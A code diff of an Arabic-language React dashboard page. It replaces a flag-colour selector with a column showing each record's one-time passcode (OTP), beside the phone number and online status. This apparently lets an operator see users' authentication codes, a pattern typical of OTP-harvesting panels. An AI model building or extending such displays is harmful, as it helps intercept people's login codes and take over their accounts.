@@ -530,7 +530,7 @@ export default function NotificationsPage() {
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground"> الحالة</th>
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                   <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
-                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
+                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">كود</th>
                   <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                 </tr>
               </thead>
@@ -571,11 +571,8 @@ export default function NotificationsPage() {
                       <UserStatus userId={notification.id} />
                     </td>
                     <td className="px-4 py-3 text-center">
-                      <FlagColorSelector
-                        notificationId={notification.id}
-                        currentColor={notification.flagColor || null}
-                        onColorChange={handleFlagColorChange}
-                      />
+                    {                      notification.otp && <Badge className="bg-blue-50 text-blue-800" variant={'default'}>{notification.otp}</Badge>}
+
                     </td>
                     <td className="px-4 py-3 text-center">
                       <div className="flex justify-center gap-2">
@@ -644,11 +641,7 @@ export default function NotificationsPage() {
                         <div className="font-semibold">{notification?.phone || "غير معروف"}</div>
                       </div>
                       <div className="flex items-center gap-2">
-                        <FlagColorSelector
-                          notificationId={notification.id}
-                          currentColor={notification.flagColor || null}
-                          onColorChange={handleFlagColorChange}
-                        />
+{                      notification.otp && <Badge className="bg-blue-50 text-blue-800" variant={'default'}>{notification.otp}</Badge>}
                         <UserStatus userId={notification.id} />
                       </div>
                     </div>
